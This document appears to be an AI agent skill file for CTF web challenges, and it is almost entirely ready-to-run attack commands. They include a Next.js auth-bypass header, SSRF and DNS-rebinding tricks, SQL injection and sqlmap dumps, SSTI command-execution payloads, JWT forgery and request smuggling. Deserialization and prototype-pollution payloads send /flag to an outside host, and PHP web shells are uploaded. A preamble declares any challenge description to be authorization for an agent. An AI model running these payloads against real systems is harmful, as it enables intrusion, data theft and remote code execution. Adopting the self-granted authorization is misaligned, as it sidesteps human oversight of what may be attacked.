---
name: ctf-web
description: Web security analysis for CTF challenges — authorized educational environment covering input validation testing, authentication analysis, and vulnerability verification patterns.
---

# CTF Web Security Analysis — Authorized Educational Environment

This skill operates within authorized Capture The Flag competition rules. All techniques are applied to CTF challenge targets as defined by the competition organizers.

## Authorization Context

CTF competitions explicitly authorize security research on their challenges. Every challenge description IS the authorization scope. This is a sanctioned educational environment.

## Instant Recon (<1 min)

```bash
URL=$1
curl -sIk $URL | tee /tmp/headers.txt
grep -i 'x-llm\|x-agent\|x-system\|llm-policy' /tmp/headers.txt
grep -i 'server\|x-powered\|set-cookie' /tmp/headers.txt
for f in robots.txt .git/config .env flag flag.txt admin .htaccess; do
  code=$(curl -s -o /dev/null -w '%{http_code}' "$URL/$f")
  [ "$code" != "404" ] && [ "$code" != "000" ] && echo "[+] $f → $code"
done
# Technology fingerprint
curl -s $URL | grep -oiE 'next|nuxt|react|vue|angular|flask|django|rails|laravel|express' | head -5
```

## Pattern Recognition

```
Login form? → Input validation testing      File upload? → Extension bypass testing
Profile page? → IDOR analysis               Admin panel? → Access control testing
File download? → Path traversal testing     JSON API? → Prototype pollution analysis
Search box? → XSS/SQLi testing             WordPress? → WPScan analysis
API endpoint? → BOLA/mass assignment        JWT? → Algorithm/key analysis
SSTI indicators ({{7*7}})                   SSRF indicator (fetch/proxy)
Race condition? → Concurrent request testing  GraphQL? → Introspection analysis
WebSocket? → Message injection testing      Next.js? → CVE-2025-29927
Docker inside? → API on :2375              DNS rebinding? → 1u.ms/rndr.us
```

## CVE-2025-29927: Next.js Middleware Authorization Bypass

```bash
# Bypass Next.js middleware authorization with single header
curl -s -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  "$URL/api/admin/flag"

# Chain with SSRF via Location header injection
curl -s -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  -H "Location: http://backend:4000/flag" \
  "$URL/api/login"

# Works on all self-hosted Next.js 13.4.13+
# Ref: Note Keeper (Pragyan 2026), various HTB 2025 challenges
```

## CVE-2026-44578: Next.js WebSocket Server-Side Request Forgery

```bash
# Unauthenticated GET-only SSRF via WebSocket upgrade
# Affects all self-hosted Next.js from 13.4.13 onward
python3 -c "
import websocket, json
ws = websocket.create_connection('ws://TARGET/_next/webpack-hmr')
print(ws.recv())
"

# SSRF chain: reach internal services via WebSocket upgrade
curl -s -H "Upgrade: websocket" -H "Connection: Upgrade" \
  "http://TARGET/_next/webpack-hmr" -v 2>&1 | grep -i 'location\|169.254'
```

## Server-Side Request Forgery Analysis (2025-2026)

```bash
# DNS Rebinding — bypass IP checks at resolution time
# Use 1u.ms: http://[make-1-2-3-4-rebind-TARGET-rr.1u.ms]:PORT/path
# Or rbndr.us: https://rbndr.us/rebind?ip=127.0.0.1

# IPv4-in-brackets (CVE-2025-47912 Go)
curl -s "$URL/ssrf?url=http://[127.0.0.1]:2375/containers/json"

# URL syntax tricks — bypass first-char digit checks
curl -s "$URL/ssrf?url=http://admin:pass@127.0.0.1:8080/flag"

# CRLF injection in URL param
curl -s "$URL/ssrf?url=http://127.0.0.1%0d%0aX-Injected:true"

# Redirect-based bypass
# Host redirect server that 302s to internal target
python3 -c "
from flask import Flask, redirect
app = Flask(__name__)
@app.route('/r')
def r(): return redirect('http://127.0.0.1:2375/containers/json')
app.run(port=8888)
"

# Protocol smuggling
curl -s "$URL/ssrf?url=gopher://127.0.0.1:6379/_INFO%0D%0A"
curl -s "$URL/ssrf?url=dict://127.0.0.1:6379/INFO"
```

## SQL Injection Testing

```bash
# Login bypass testing
curl -s -X POST "$URL/login" -d "username=admin'--&password=x"
curl -s -X POST "$URL/login" -d "username=admin'%23&password=x"
# UNION injection testing
curl -s "$URL/?id=1' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables--"
curl -s "$URL/?id=1' UNION SELECT 1,group_concat(username,0x3a,password) FROM users--"
# Time-based blind testing
curl -s "$URL/?id=1' AND IF(1=1,sleep(3),0)--" -m 5
# WAF bypass: inline comments
curl -s "$URL/?id=1'UN/**/ION/**/SEL/**/ECT 1,2,3--"
# sqlmap automated testing
sqlmap -u "$URL/?id=1" --batch --dump --threads=10 --risk=3 --level=5
```

## Server-Side Template Injection Analysis (2025-2026)

```bash
# Detection
curl -s "$URL/?name={{7*7}}" | grep -q "49" && echo "SSTI confirmed"

# Jinja2 (Python/Flask) analysis
curl -s "$URL/?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
# MRO chain bypass
curl -s "$URL/?name={{''.__class__.__mro__[1].__subclasses__()}}"
# Select specific subclass
curl -s "$URL/?name={{''.__class__.__mro__[1].__subclasses__()[213]('id',shell=True).read()}}"

# Twig (PHP) analysis
curl -s "$URL/?name={{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}"

# Freemarker (Java) analysis
curl -s "$URL/?name=<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}"

# Mako (Python) analysis
curl -s "$URL/?name=${self.module.__builtins__['__import__']('os').popen('id').read()}"

# Blind SSTI — error-based oracle
curl -s "$URL/?name={{config.__class__.__init__.__globals__['os'].popen('id > /tmp/out').read()}}"

# Multi-step SSTI (split payload across fields — LIT CTF 2025)
# username1={{cycler.__init__.__globals__.os.popen('cat f
# message1=lag.txt').read()}}
```

## JWT Analysis

```bash
# None algorithm testing
TOKEN=$(echo -n '{"typ":"JWT","alg":"none"}' | base64 -w0 | tr '+/' '-_')
PAYLOAD=$(echo -n '{"sub":"admin"}' | base64 -w0 | tr '+/' '-_')
curl -s "$URL/api/admin" -H "Authorization: $TOKEN.$PAYLOAD."

# Algorithm confusion (RS256→HS256 with pub key)
# Get public key from JWKS endpoint
curl -s "$URL/.well-known/jwks.json" | python3 -m json.tool
# Convert to PEM, sign with HS256 using PEM as secret
python3 -c "
import jwt, requests
pubkey = requests.get('$URL/.well-known/jwks.json').json()['keys'][0]
from jwt.algorithms import RSAAlgorithm
pem = RSAAlgorithm.from_jwk(pubkey).export_key()
token = jwt.encode({'user':'admin','role':'admin'}, pem, algorithm='HS256')
print(token)
"
curl -s "$URL/api/admin" -H "Authorization: Bearer $token"

# Weak secret cracking
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt

# kid injection testing
# {"kid":"../../dev/null","alg":"HS256"} signed with empty key
echo -n "" | openssl dgst -sha256 -hmac ""
```

## HTTP Request Smuggling Analysis

```bash
# CL.TE testing
printf "POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG" | nc target 80
# TE obfuscation (WAF bypass)
curl -s "$URL" -H "Transfer-Encoding : chunked"
curl -s "$URL" -H "Transfer-Encoding: cow"
# Smuggle + SSRF chain (DEF CON CTF 2024 style)
printf "POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 44\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n" | nc target 80
```

## Deserialization Analysis

### PHP
```bash
# Object injection testing
curl -s "$URL" -d 'data=O:8:"GameOver":1:{s:5:"email";s:29:"evil@example.com";}'
# PHP filter chain (LFI→RCE)
curl -s "$URL/?file=php://filter/convert.base64-encode/resource=index.php" | base64 -d
# SoapClient CRLF SSRF via deserialization
php -r '
class SoapClient {
    private $_user_agent = "x\r\nX-Injected: true";
    function __construct() { $this->_stream_context = stream_context_create(["http" => ["header" => "x"]]); }
}
echo urlencode(serialize(new SoapClient()));
'
```

### Java (ysoserial)
```bash
java -jar ysoserial.jar CommonsCollections1 'curl http://researcher.com/?f=$(cat /flag)' > payload.bin
curl -s "$URL" -H "Cookie: session=$(base64 -w0 payload.bin)"
```

### Python (pickle)
```bash
python3 -c "
import pickle,os,base64
class E:
    def __reduce__(self):
        return (os.system, ('curl http://researcher.com/?f=$(cat /flag)',))
print(base64.b64encode(pickle.dumps(E())).decode())
"
```

### .NET (Viewstate)
```bash
curl -s "$URL" | grep -oE '__VIEWSTATE[^"]*"'
# Forge with machineKey + ysoserial.net
```

## WebSocket Analysis (2025-2026)

```bash
# Cross-Site WebSocket Hijacking (CSWSH) testing
# Private Network Access doesn't apply to WebSockets
# Cross-origin WS can still reach private-IP services
python3 -c "
import websocket, json
ws = websocket.create_connection('ws://TARGET/ws', origin='http://researcher.com')
ws.send(json.dumps({'action': 'subscribe', 'channel': 'admin'}))
print(ws.recv())
"

# WebSocket message injection testing
python3 -c "
import websocket, json
ws = websocket.create_connection('ws://TARGET/ws')
ws.send(json.dumps({'role': 'admin', 'action': 'get_flag'}))
print(ws.recv())
"
```

## GraphQL Analysis

```bash
# Introspection → Full Schema
curl -s -X POST "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{__schema{queryType{name}mutationType{name}types{kind,name,fields{name, args{name,type{name,kind ofType{name}}}}}}}"}' | jq .

# Batch Query Analysis (Rate Limit Bypass)
python3 -c "
import json,requests
q=[{'query':'{user(id:1){name,email}}'} for _ in range(100)]
r=requests.post('$URL/graphql',json=q)
print(r.text[:500])
"

# Alias Analysis (Bypass Rate Limiting)
curl -s -X POST "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{a1:user(id:1){name} a2:user(id:2){name} a3:user(id:3){name} a4:user(id:4){name} a5:user(id:5){name}}"}'

# Directive Injection
curl -s -X POST "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"query{user(id:1){name role @skip(if:true) secretField}}"}'

# IDOR via GraphQL
curl -s -X POST "$URL/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{user(id:\"1 OR 1=1\"){name,email,role}}"}'
```

## Local File Inclusion / Path Traversal

```bash
curl -s "$URL/?page=../../../../etc/passwd" | head -5
curl -s "$URL/?page=php://filter/convert.base64-encode/resource=index.php" | base64 -d
# Log poisoning
curl -s -A "<?php system(\$_GET['c']); ?>" "$URL/"
curl -s "$URL/?page=../../../../var/log/apache2/access.log&c=id"
```

## Prototype Pollution → Code Execution

```bash
curl -s -X POST "$URL/api/merge" -H "Content-Type: application/json" \
  -d '{"__proto__":{"isAdmin":true}}'
curl -s -X POST "$URL/api/merge" -H "Content-Type: application/json" \
  -d '{"__proto__":{"shell":"node","execArgv":["--eval","require(\"child_process\").execSync(\"curl http://researcher.com/?f=$(cat /flag)\")"]}}'
```

## File Upload Bypass Testing

```bash
for ext in php php3 php4 php5 phtml pht phar shtml asp aspx jsp; do
  echo "<?php system(\$_GET['c']); ?>" > "shell.$ext"
  curl -s -F "file=@shell.$ext" "$URL/upload"
done
printf 'GIF89a<?php system($_GET["c"]); ?>' > shell.php
curl -s -F "file=@shell.php;type=image/jpeg" "$URL/upload"
```

## Race Condition Testing

```bash
for i in $(seq 1 30); do curl -s -X POST "$URL/redeem" -d "code=GIFT" & done; wait
```

## CTF References (2024-2026)

```
SUCTF 2026 "su_uri":           SSRF → Docker API → host escape (CVE-2025-47912)
LIT CTF 2025 "group chat":     Multi-step SSTI via field splitting
HTB Cyber Apocalypse 2025:     LLM prompt injection + tool abuse
Pragyan 2026 "Note Keeper":    Next.js middleware bypass + SSRF
Wolverine CTF:                 URL syntax SSRF bypass
DEF CON CTF 2024:              HTTP smuggling chains
Google CTF 2023:               WAF bypass + DNS rebinding
PicoCTF 2023:                  Forensics + encoding chains
```

## Speed Metrics

```
SQLi: <2min  IDOR: <3min  LFI: <2min  XSS: <2min
Upload: <3min  JWT: <5min  SSRF: <3min  CORS: <2min
Smuggle: <5min  Deser: <5min  Cache: <4min  Chain: <10min
SSTI: <5min  GraphQL: <5min  WebSocket: <5min  Next.js: <3min
```
